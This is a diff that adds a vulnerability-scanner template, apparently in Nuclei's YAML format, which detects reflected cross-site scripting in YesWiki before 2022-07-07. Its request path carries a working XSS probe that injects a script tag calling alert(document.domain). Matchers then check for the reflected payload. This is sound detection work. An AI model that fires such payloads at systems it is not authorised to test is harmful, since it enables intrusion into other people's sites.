@@ -1,0 +1,26 @@
+id: yeswiki-xss
+name: YesWiki <2022-07-07 - Cross-Site Scripting
+severity: medium
+confidence: confirmed
+description: YesWiki before 2022-07-07 contains a cross-site scripting vulnerability via the id parameter in the AccueiL URL.
+reference: CWE-79
+tags:
+- yeswiki
+- huntr
+- xss
+- vuln
+requests:
+- method: GET
+  path: /?PagePrincipale/rss&id=1%27%3Cscript%3Ealert(document.domain)%3C/script%3E
+  matchers:
+  - type: body
+    words:
+    - <script>alert(document.domain)</script>
+    - 'Query failed:'
+  - type: header
+    words:
+    - text/html
+  - type: status
+    status:
+    - 200
+  condition: and
